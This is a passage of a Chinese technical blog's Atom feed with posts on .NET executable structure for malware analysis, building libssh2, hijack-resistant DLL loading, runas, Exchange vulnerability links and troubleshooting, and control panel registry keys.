image_core_ilmethod_fat.instruction[]。为了更好的理解和查看指令的值（操作码），我们将在 IDA 中打开恶意软件：</p><img src="/B_Code/CSharp/%E3%80%90.Net%E3%80%91%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/image-2.png" class="" title="IDA解析的函数"><p>我们可以看到左边是每个操作妈的值，遵循 dnSpy 中的前两条指令：</p><img src="/B_Code/CSharp/%E3%80%90.Net%E3%80%91%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/instructions.gif" class="" title="img"><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在对 .NET 可执行文件结构的初步探索中，我们已经深入研究了 .NET 框架的复杂性，强调了其合法开发和恶意软件创建的双重用途。通过剖析 .NET 编译、运行以及元数据和程序集的复杂细节，我们已经为理解 .NET 程序函数如何执行以及如何为恶意目的操作它们奠定了基础。随着你深入研究 .NET 恶意软件逆向工程技术，你会发现这对你有效分析和对抗基于 .NET 威胁的恶意软件非常有效。</p><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><p>标记类型表</p><table><thead><tr><th>Token Type</th><th>Value(Hex)</th><th>Description</th></tr></thead><tbody><tr><td>Module</td><td>0x00</td><td>References a module definition. 引用模块定义</td></tr><tr><td>TypeRef</td><td>0x01</td><td>References a type in another module. 引用另一个模块类型</td></tr><tr><td>TypeDef</td><td>0x02</td><td>Defines a type within the module.</td></tr><tr><td>FieldDef</td><td>0x04</td><td>Defines a field within a type.</td></tr><tr><td>MethodDef</td><td>0x06</td><td>Defines a method within a type.</td></tr><tr><td>ParamDef</td><td>0x08</td><td>Defines a parameter for a method.</td></tr><tr><td>InterfaceImpl</td><td>0x09</td><td>Defines interface implementations for a type.</td></tr><tr><td>MemberRef</td><td>0x0A</td><td>References a field or method in another module.</td></tr><tr><td>CustomAttribute</td><td>0x0C</td><td>Defines a custom attribute.</td></tr><tr><td>Permission</td><td>0x0E</td><td>Defines declarative security permissions.</td></tr><tr><td>Signature</td><td>0x11</td><td>Defines a standalone signature.</td></tr><tr><td>Event</td><td>0x14</td><td>Defines an event within a type.</td></tr><tr><td>Property</td><td>0x17</td><td>Defines a property within a type.</td></tr><tr><td>ModuleRef</td><td>0x1A</td><td>References an external module.</td></tr><tr><td>TypeSpec</td><td>0x1B</td><td>Specifies a type using a signature.</td></tr><tr><td>Assembly</td><td>0x20</td><td>Defines assembly metadata.</td></tr><tr><td>AssemblyRef</td><td>0x23</td><td>References another assembly.</td></tr><tr><td>File</td><td>0x26</td><td>Defines an external file associated with the assembly.</td></tr><tr><td>ExportedType</td><td>0x27</td><td>Defines a type exported from another assembly.</td></tr><tr><td>ManifestResource</td><td>0x28</td><td>Defines an embedded resource.</td></tr><tr><td>GenericParam</td><td>0x2A</td><td>Defines a generic parameter for a type or method.</td></tr><tr><td>MethodSpec</td><td>0x2B</td><td>Specifies a method instantiation for a generic method.</td></tr><tr><td>GenericParamConstraint</td><td>0x2C</td><td>Specifies constraints on a generic parameter.</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：.Net 可执行文件结构分析（翻译）&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="B_Code" scheme="http://example.com/categories/B-Code/"/>
    
    <category term="CSharp" scheme="http://example.com/categories/B-Code/CSharp/"/>
    
    
    <category term="C#" scheme="http://example.com/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>【libssh2】 Windows 下 libssh2 编译步骤</title>
    <link href="http://example.com/C_OpenSource/libssh2/"/>
    <id>http://example.com/C_OpenSource/libssh2/</id>
    <published>2024-03-12T06:29:26.830Z</published>
    <updated>2024-04-12T06:48:46.978Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：windows操作下编译 libssh2 静态库</p></blockquote><span id="more"></span><ol><li><p>运行管理员 CMD</p></li><li><p>cmd 中运行要编译版本的 vcvars32.bat</p></li><li><p>cmake 配置编译环境</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmake -DBUILD_SHARED_LIBS=<span class="keyword">ON</span> -DBUILD_STATIC_LIBS=<span class="keyword">ON</span> -DBUILD_EXAMPLES=<span class="keyword">OFF</span> -DOPENSSL_ROOT_DIR=<span class="string">&quot;D:\OpenSSL-3.1-Win32-mtd&quot;</span> -DOPENSSL_CRYPTO_LIBRARY=<span class="string">&quot;D:\OpenSSL-Win32\lib&quot;</span> -DBUILD_TESTING=<span class="keyword">OFF</span> -A Win32 . -B <span class="string">&quot;x86&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>cmake 编译（或者使用sln工程）</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmake --build x86 --config Debug</span><br><span class="line"><span class="comment"># x64 Release</span></span><br><span class="line">cmake --build x64 --config Release</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：windows操作下编译 libssh2 静态库&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="C_OpenSource" scheme="http://example.com/categories/C-OpenSource/"/>
    
    
  </entry>
  
  <entry>
    <title>【API】 安全加载DLL</title>
    <link href="http://example.com/A_OS/Windows/API/%E5%AE%89%E5%85%A8%E5%8A%A0%E8%BD%BDDLL/"/>
    <id>http://example.com/A_OS/Windows/API/%E5%AE%89%E5%85%A8%E5%8A%A0%E8%BD%BDDLL/</id>
    <published>2024-03-07T03:10:28.902Z</published>
    <updated>2024-04-12T06:49:22.302Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：如何安全加载dll文件，防止 dll 替换</p></blockquote><span id="more"></span><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__inline HMODULE WINAPI <span class="title">LoadLibraryEx_api</span><span class="params">(LPCTSTR lpFileName, HANDLE hFile, DWORD dwFlags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> ::<span class="built_in">LoadLibraryEx</span>(lpFileName, hFile, dwFlags);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//安全版LoadLibrary_api，可以降低dll劫持的可能性</span></span><br><span class="line"><span class="function">HMODULE WINAPI <span class="title">LoadLibrary_api_s</span><span class="params">(LPCTSTR lpFileName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __360PubDLLSafeInitHelper</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">当使用 S360时，我们优先使用 S360 提供是 DLL 安全加载。</span></span><br><span class="line"><span class="comment">这是因为 S360 提供的LoadLibraryFormSystem32能为Windows XP以及其他所有没有安装 KB2533623 的系统提供 LOAD_LIBRARY_SEARCH_SYSTEM32 特性。</span></span><br><span class="line"><span class="comment">提升不支持 LOAD_LIBRARY_SEARCH_SYSTEM32 特性系统中的安全性。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">return</span> S360::Helper::<span class="built_in">LoadLibraryFormSystem32</span>(lpFileName);</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined _M_IX86 || defined _M_AMD64 || defined _M_IA64</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">https://docs.microsoft.com/zh-cn/windows/desktop/api/libloaderapi/nf-libloaderapi-loadlibraryexa</span></span><br><span class="line"><span class="comment">Windows 7, Windows Server 2008 R2, Windows Vista and Windows Server 2008:</span></span><br><span class="line"><span class="comment">The LOAD_LIBRARY_SEARCH_ flags are available on systems that have KB2533623 installed.</span></span><br><span class="line"><span class="comment">To determine whether the flags are available, use GetProcAddress to get the address of</span></span><br><span class="line"><span class="comment">the AddDllDirectory, RemoveDllDirectory, or SetDefaultDllDirectories function.</span></span><br><span class="line"><span class="comment">If GetProcAddress succeeds, the LOAD_LIBRARY_SEARCH_ flags can be used with LoadLibraryEx.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//不再使用ERROR_INVALID_PARAMETER判断，规避联想一键影音导致的Hook Bug。</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> bSafeLoadAvailable = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bSafeLoadAvailable == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//此处不考虑线程安全，因为多执行一次 GetProcAddress 操作没什么大不了的。</span></span><br><span class="line">bSafeLoadAvailable = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleW</span>(<span class="string">L&quot;Kernel32.dll&quot;</span>), <span class="string">&quot;AddDllDirectory&quot;</span>) != <span class="literal">NULL</span> ? <span class="number">1</span> : <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//尝试使用DLL安全初始化</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">LoadLibraryEx_api</span>(lpFileName, <span class="literal">NULL</span>, bSafeLoadAvailable == <span class="number">1</span> ? <span class="comment">/*LOAD_LIBRARY_SEARCH_SYSTEM32*/</span><span class="number">0x00000800</span> : <span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span> <span class="comment">// ARM || ARM64</span></span></span><br><span class="line"><span class="comment">//始终使用DLL安全初始化</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">LoadLibraryEx_api</span>(lpFileName, <span class="literal">NULL</span>, <span class="comment">/*LOAD_LIBRARY_SEARCH_SYSTEM32*/</span><span class="number">0x00000800</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：如何安全加载dll文件，防止 dll 替换&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_OS" scheme="http://example.com/categories/A-OS/"/>
    
    <category term="Windows" scheme="http://example.com/categories/A-OS/Windows/"/>
    
    <category term="API" scheme="http://example.com/categories/A-OS/Windows/API/"/>
    
    
  </entry>
  
  <entry>
    <title>【cmd】 runas</title>
    <link href="http://example.com/A_OS/Windows/cmd/runas/"/>
    <id>http://example.com/A_OS/Windows/cmd/runas/</id>
    <published>2024-02-26T07:04:37.056Z</published>
    <updated>2024-02-26T07:09:36.712Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：runas 命令用法整理</p></blockquote><span id="more"></span><h2 id="0x01-帮助手册"><a href="#0x01-帮助手册" class="headerlink" title="0x01 帮助手册"></a>0x01 帮助手册</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">runas /?</span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">holdy</span>&gt;<span class="title">runas</span> /?</span></span><br><span class="line"><span class="function"><span class="title">RUNAS</span> 用法:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">RUNAS</span> [ [/<span class="title">noprofile</span> | /<span class="title">profile</span>] [/<span class="title">env</span>] [/<span class="title">savecred</span> | /<span class="title">netonly</span>] ]</span></span><br><span class="line"><span class="function">        /<span class="title">user</span>:&lt;<span class="title">UserName</span>&gt; <span class="title">program</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">RUNAS</span> [ [/<span class="title">noprofile</span> | /<span class="title">profile</span>] [/<span class="title">env</span>] [/<span class="title">savecred</span>] ]</span></span><br><span class="line"><span class="function">        /<span class="title">smartcard</span> [/<span class="title">user</span>:&lt;<span class="title">UserName</span>&gt;] <span class="title">program</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">RUNAS</span> [ [/<span class="title">machine</span>:&lt;<span class="title">MachineType</span>&gt;] ] /<span class="title">trustlevel</span>:&lt;<span class="title">TrustLevel</span>&gt; <span class="title">program</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">   /<span class="title">noprofile</span>        指定不应该加载用户的配置文件。</span></span><br><span class="line"><span class="function">                     这会加速应用程序加载，但</span></span><br><span class="line"><span class="function">                     可能会造成一些应用程序运行不正常。</span></span><br><span class="line"><span class="function">   /<span class="title">profile</span>          指定应该加载用户的配置文件。</span></span><br><span class="line"><span class="function">                     这是默认值。</span></span><br><span class="line"><span class="function">   /<span class="title">env</span>              要使用当前环境，而不是用户的环境。</span></span><br><span class="line"><span class="function">   /<span class="title">netonly</span>          只在指定的凭据限于远程访问的情况下才使用。</span></span><br><span class="line"><span class="function">   /<span class="title">savecred</span>         用用户以前保存的凭据。</span></span><br><span class="line"><span class="function">   /<span class="title">smartcard</span>        如果凭据是智能卡提供的，则使用这个选项。</span></span><br><span class="line"><span class="function">   /<span class="title">user</span>             &lt;<span class="title">UserName</span>&gt; 应使用 <span class="title">USER</span>@<span class="title">DOMAIN</span> 或 <span class="title">DOMAIN</span>\<span class="title">USER</span> 形式</span></span><br><span class="line"><span class="function">   /<span class="title">showtrustlevels</span>  显示可以用作 /<span class="title">trustlevel</span> 的参数的</span></span><br><span class="line"><span class="function">                     信任级别。</span></span><br><span class="line"><span class="function">   /<span class="title">trustlevel</span>       &lt;<span class="title">Level</span>&gt; 应该是在 /<span class="title">showtrustlevels</span> 中枚举</span></span><br><span class="line"><span class="function">                     的一个级别。</span></span><br><span class="line"><span class="function">   /<span class="title">machine</span>          指定进程的计算机架构。</span></span><br><span class="line"><span class="function">                     &lt;<span class="title">MachineType</span>&gt; 应为 <span class="title">x86</span>|<span class="title">amd64</span>|<span class="title">arm</span>|<span class="title">arm64</span> 之一。</span></span><br><span class="line"><span class="function">   <span class="title">program</span>           <span class="title">EXE</span> 的命令行。请参阅下面的例子</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">示例:</span></span><br><span class="line"><span class="function">&gt; <span class="title">runas</span> /<span class="title">noprofile</span> /<span class="title">user:mymachine</span>\<span class="title">administrator</span> <span class="title">cmd</span></span></span><br><span class="line"><span class="function">&gt; <span class="title">runas</span> /<span class="title">profile</span> /<span class="title">env</span> /<span class="title">user:mydomain</span>\<span class="title">admin</span> &quot;<span class="title">mmc</span> %<span class="title">windir</span>%\<span class="title">system32</span>\<span class="title">dsa.msc</span>&quot;</span></span><br><span class="line"><span class="function">&gt; <span class="title">runas</span> /<span class="title">env</span> /<span class="title">user:user</span>@<span class="title">domain.microsoft.com</span> &quot;<span class="title">notepad</span> \&quot;<span class="title">my</span> <span class="title">file.txt</span>\&quot;&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">注意:  只在得到提示时才输入用户的密码。</span></span><br><span class="line"><span class="function">注意:  /<span class="title">profile</span> 跟 /<span class="title">netonly</span> 不兼容。</span></span><br><span class="line"><span class="function">注意:  /<span class="title">savecred</span> 跟 /<span class="title">smartcard</span> 不兼容。</span></span><br></pre></td></tr></table></figure><h2 id="0x02-登录"><a href="#0x02-登录" class="headerlink" title="0x02 登录"></a>0x02 登录</h2><p>以指定的用户角色启动进程</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas /USER:用户名 /netonly <span class="built_in">cmd</span>.exe</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：runas 命令用法整理&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_OS" scheme="http://example.com/categories/A-OS/"/>
    
    <category term="Windows" scheme="http://example.com/categories/A-OS/Windows/"/>
    
    <category term="cmd" scheme="http://example.com/categories/A-OS/Windows/cmd/"/>
    
    
  </entry>
  
  <entry>
    <title>【Exchange】 相关漏洞、文章整理</title>
    <link href="http://example.com/A_OS/Windows/Exchange/%E3%80%90Exchange%E3%80%91index/"/>
    <id>http://example.com/A_OS/Windows/Exchange/%E3%80%90Exchange%E3%80%91index/</id>
    <published>2024-02-23T02:21:48.765Z</published>
    <updated>2024-02-23T02:25:49.137Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：Exchange 相关漏洞及其相关文章整理</p></blockquote><span id="more"></span><h2 id="0x01-CVE-2021-26855"><a href="#0x01-CVE-2021-26855" class="headerlink" title="0x01 CVE-2021-26855"></a>0x01 CVE-2021-26855</h2><p>相关文章：</p><ul><li><a href="https://zhuanlan.zhihu.com/p/357183471">Microsoft Exchange Server CVE-2021–26855 漏洞利用 - 知乎</a></li><li><a href="https://www.praetorian.com/blog/reproducing-proxylogon-exploit/">Reproducing the Microsoft Exchange Proxylogon Exploit Chain |</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：Exchange 相关漏洞及其相关文章整理&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_OS" scheme="http://example.com/categories/A-OS/"/>
    
    <category term="Windows" scheme="http://example.com/categories/A-OS/Windows/"/>
    
    <category term="Exchange" scheme="http://example.com/categories/A-OS/Windows/Exchange/"/>
    
    
  </entry>
  
  <entry>
    <title>【C】开发文章推荐</title>
    <link href="http://example.com/B_Code/C/C%E5%A5%BD%E6%96%87%E6%8E%A8%E8%8D%90/"/>
    <id>http://example.com/B_Code/C/C%E5%A5%BD%E6%96%87%E6%8E%A8%E8%8D%90/</id>
    <published>2024-02-23T02:01:55.629Z</published>
    <updated>2024-02-23T02:25:42.661Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：C开发相关文章推荐</p></blockquote><span id="more"></span><h2 id="0x01-关键字"><a href="#0x01-关键字" class="headerlink" title="0x01 关键字"></a>0x01 关键字</h2><ul><li><a href="https://zhuanlan.zhihu.com/p/343688629">C语言丨深入理解volatile关键字 - 知乎</a></li><li><a href="https://www.runoob.com/w3cnote/c-volatile-keyword.html">C&#x2F;C++ 中 volatile 关键字详解 | 菜鸟教程</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：C开发相关文章推荐&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="B_Code" scheme="http://example.com/categories/B-Code/"/>
    
    <category term="C" scheme="http://example.com/categories/B-Code/C/"/>
    
    
  </entry>
  
  <entry>
    <title>【异常处理】Exchange异常</title>
    <link href="http://example.com/A_OS/Windows/%E5%BC%82%E5%B8%B8%E5%8F%8A%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86/Exchange%E5%BC%82%E5%B8%B8/"/>
    <id>http://example.com/A_OS/Windows/%E5%BC%82%E5%B8%B8%E5%8F%8A%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86/Exchange%E5%BC%82%E5%B8%B8/</id>
    <published>2024-02-22T07:22:26.850Z</published>
    <updated>2024-02-22T08:43:39.639Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：Exchange 运行异常整理及解决方案</p></blockquote><span id="more"></span><h2 id="0x01-ecp、owa登录后报错-http-500"><a href="#0x01-ecp、owa登录后报错-http-500" class="headerlink" title="0x01 ecp、owa登录后报错 http 500"></a>0x01 ecp、owa登录后报错 http 500</h2><p>本人环境：windows server 2016 + exchange 2016 cu21</p><p>问题描述：Exchange 登录 ecp 或者 owa 之后报错 http Error 500</p><p>相关链接：</p><ol><li><a href="https://community.spiceworks.com/topic/2176642-http-500-eac-owa-exhange-2016-server-2016">http 500 EAC&#x2F;OWA exhange 2016 server 2016</a></li><li><a href="https://learn.microsoft.com/en-us/answers/questions/711247/exchange-server-2019-http-error-500">Exchange Server 2019 HTTP Error 500 - Microsoft Q&amp;A</a></li><li><a href="https://www.jianshu.com/p/4de78f42b3a7">Exchange 2019 访问OWA或者ECP 提示HTTP 500错误的解决方案 - 简书</a></li><li><a href="https://blog.ollischer.com/exchange-2016-http-error-500-after-logging-into-ecpowa">Exchange 2016 - HTTP Error 500 after logging into ECP&#x2F;OWA - blog - Alexander Ollischer | Citrix | Microsoft</a></li></ol><p>如果以下方案还是不行，可以再尝试一下重置 Exchange，微软官网文档：<a href="https://learn.microsoft.com/zh-cn/exchange/high-availability/disaster-recovery/recover-exchange-servers?view=exchserver-2019">恢复 Exchange 服务器、恢复丢失Exchange Server、丢失Exchange Server恢复 | Microsoft Learn</a></p><h3 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h3><p>先说一下本人解决的步骤，以下几个方法我都尝试后重启电脑，然后 Exchange 恢复正常。i cant distinguish which operation is effective.</p><h4 id="运行-UpdateCas-ps1"><a href="#运行-UpdateCas-ps1" class="headerlink" title="运行 UpdateCas.ps1"></a>运行 <strong>UpdateCas.ps1</strong></h4><p>参考 <a href="https://blog.ollischer.com/exchange-2016-http-error-500-after-logging-into-ecpowa">Exchange 2016 - HTTP Error 500 after logging into ECP&#x2F;OWA - blog - Alexander Ollischer | Citrix | Microsoft</a></p><ol><li><strong>C:\Program Files\Microsoft\Exchange Server\V15\Bin</strong> 目录</li><li>找到 <code>UpdateCas.ps1</code> 并运行</li><li>cmd中运行 iisreset (或者重启系统)</li></ol><h4 id="删除owa目录"><a href="#删除owa目录" class="headerlink" title="删除owa目录"></a>删除owa目录</h4><p>禁用管理员然后启用</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Disable-Mailbox</span> administrator</span><br><span class="line"><span class="built_in">Enable-Mailbox</span> administrator</span><br></pre></td></tr></table></figure><p>最后还是重启下 iis 服务或者重启操作系统</p><h4 id="重新创建-OWA-虚拟目录"><a href="#重新创建-OWA-虚拟目录" class="headerlink" title="重新创建 OWA 虚拟目录"></a>重新创建 OWA 虚拟目录</h4><p>可以使用 Get-OwaVirtualDirectory 查看当前存在的 OWA 虚拟目录</p><ol><li>打开 Exchange Management Shell</li><li>移除 OWA 虚拟目录</li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Remove-OwaVirtualDirectory</span>  <span class="string">&#x27;EXCHANGE\owa (Default Web Site)&#x27;</span> <span class="comment"># ‘EXCHANGE’为 exchange 主机名称</span></span><br></pre></td></tr></table></figure><ol start="3"><li>创建 OWA 虚拟目录</li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-OwaVirtualDirectory</span> <span class="literal">-WebSiteName</span> <span class="string">&#x27;Default Web Site&#x27;</span></span><br></pre></td></tr></table></figure><p>操作完成后重启 iis 服务或者重启操作系统</p><h4 id="回收应用池"><a href="#回收应用池" class="headerlink" title="回收应用池"></a>回收应用池</h4><ol><li>在 服务器面 板 — 打 开 工具“ASDI 编 辑 器 ” ，右键，连接到，<br>找 到“连接点”的“选择一个已知命名上下文”，下拉选择“ 配 置 ”<br>— 然 后 找 到“CN&#x3D;Services”<br>—“CN&#x3D;Microsoft Exchange”—“CN&#x3D;&lt;你的 Exchange 组织名称”—“CN&#x3D;Client Acess”<br>—右击“属性”—打开“编辑器”窗口—找到”MSExchCanaryData”—“属性”，然后清空该选项；</li><li>打开 Internet Iformation Service (IIS)，找到“应用程序池”，找到“MSExchangeOWAAppPool”，点击回收。</li></ol><p>操作完成后重启 iis 服务或者重启操作系统</p><h4 id="移除-config-文件"><a href="#移除-config-文件" class="headerlink" title="移除 config 文件"></a>移除 config 文件</h4><p>将 <code>C:\inetpub\wwwroot</code> 目录下的 <code>web.config</code> 移出。我的操作是修改了文件名，最后还是改回了 <code>web.config</code></p><h2 id="0x02-Exchange-登录后提示没有该邮箱"><a href="#0x02-Exchange-登录后提示没有该邮箱" class="headerlink" title="0x02 Exchange 登录后提示没有该邮箱"></a>0x02 Exchange 登录后提示没有该邮箱</h2><p>可能的原因，之前的操作中禁用了该邮箱。</p><p>可以使用以下命令启用：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Enable-Mailbox</span> administrator</span><br></pre></td></tr></table></figure><p>或者</p><p>使用如下所示的命令修复</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-MailboxRestoreRequest</span> <span class="literal">-SourceDatabase</span> RecoveryDB01 <span class="literal">-SourceStoreMailbox</span> GUID <span class="literal">-TargetMailbox</span> test@keyman .com</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：Exchange 运行异常整理及解决方案&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_OS" scheme="http://example.com/categories/A-OS/"/>
    
    <category term="Windows" scheme="http://example.com/categories/A-OS/Windows/"/>
    
    <category term="异常及错误处理" scheme="http://example.com/categories/A-OS/Windows/%E5%BC%82%E5%B8%B8%E5%8F%8A%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86/"/>
    
    
  </entry>
  
  <entry>
    <title>【控制面板】注册表相关</title>
    <link href="http://example.com/A_OS/Windows/%E3%80%90%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF%E3%80%91%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9B%B8%E5%85%B3/"/>
    <id>http://example.com/A_OS/Windows/%E3%80%90%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF%E3%80%91%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9B%B8%E5%85%B3/</id>
    <published>2024-02-20T16:00:00.000Z</published>
    <updated>2024-04-16T01:31:35.726Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：控制面板相关注册表，以及控制面板程序开发</p></blockquote><span id="more"></span><h2 id="0x01-控制面板项目"><a href="#0x01-控制面板项目" class="headerlink" title="0x01 控制面板项目"></a>0x01 控制面板项目</h2><style>.iooyqxipescr{zoom:50%;}</style><img src="/A_OS/Windows/%E3%80%90%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF%E3%80%91%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9B%B8%E5%85%B3/image-20240221100622711.png" class="iooyqxipescr" alt="image-20240221100622711"><p>对应的注册表位置：</p><p><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ControlPanel\NameSpace</code></p><p>说明：</p><p>用于存储和控制控制面板（Control Panel）中的项目。具体来说，<code>ControlPanel\NameSpace</code>键下通常包含了一系列的子键，每个子键都代表控制面板中的一个特定的文件夹或项目。这些子键通常有一个名为<code>&#123;GUID&#125;</code>的名称，其中<code>GUID</code>是一个全局唯一标识符，用于唯一标识该文件夹或项目。</p><p>例如，如果你想在控制面板中添加或删除一个项目，你可能需要修改这个键或其下的子键。通过添加或删除子键，你可以改变控制面板的外观和行为。</p><h2 id="0x02-控制面板项目"><a href="#0x02-控制面板项目" class="headerlink" title="0x02 控制面板项目"></a>0x02 控制面板项目</h2><p>控制面板项本身通常存储在 <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Control Panel\Cputs</code> 或 <code>HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Control Panel\Cputs</code>（对于 32 位程序在 64 位系统上的情况）中。每个控制面板项都有一个对应的 GUID，并指向其可执行文件或 DLL。</p><p>不过，<code>ControlPanel\NameSpace</code> 通常用于自定义桌面上的“控制面板”文件夹内容，而不是直接控制控制面板项本身。</p><p>对于 <code>ControlPanel\NameSpace</code> 下的 